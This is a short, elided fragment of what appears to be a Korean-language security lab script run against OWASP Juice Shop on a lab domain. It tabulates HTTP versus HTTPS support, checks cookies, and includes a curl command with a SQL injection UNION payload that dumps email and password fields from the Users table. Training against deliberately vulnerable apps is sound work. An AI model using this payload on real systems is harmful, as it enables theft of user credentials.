...
=== HTTP/HTTPS 지원 매트릭스 ===
endpoint                       HTTP       HTTPS      verdict
JuiceShop (juice.6v6.lab/3000) 200      X          ★ HTTP only (취약)
...
for url in "http://10.20.32.80:80" "http://juice.6v6.lab" "https://10.20.30.100:443"; do
...
curl -s "http://juice.6v6.lab/rest/products/search?q=test%27%29%29UNION+SELECT+email,password,3,4,5,6,7,8,9+FROM+Users+LIMIT+5--" | python3 -c "
import sys, json
...
echo "=== 로그인 API 프로토콜 ==="
echo "현재 로그인 URL: http://juice.6v6.lab/rest/user/login"
...
check_cookie "JuiceShop" "http://juice.6v6.lab"
